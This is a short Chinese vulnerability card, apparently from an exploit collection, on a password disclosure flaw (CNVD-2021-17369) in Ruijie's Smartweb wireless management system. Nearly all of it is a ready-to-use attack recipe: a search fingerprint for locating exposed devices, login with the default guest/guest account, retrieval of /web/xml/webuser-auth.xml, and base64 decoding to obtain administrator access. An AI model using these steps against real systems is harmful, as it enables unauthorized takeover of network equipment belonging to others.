# 锐捷Smartweb管理系统密码信息泄露漏洞CNVD-2021-17369

锐捷 ｜ 信息泄露 ｜ —
- **指纹**：`web.body="img/free_login_ge.gif"`

**Payload**
```
使用默认口令guest/guest登录系统
之后访问
/web/xml/webuser-auth.xml
base64解码解密后登录admin权限后台
>
```
- **其他**：版本: 锐捷网络股份有限公司 无线smartweb管理系统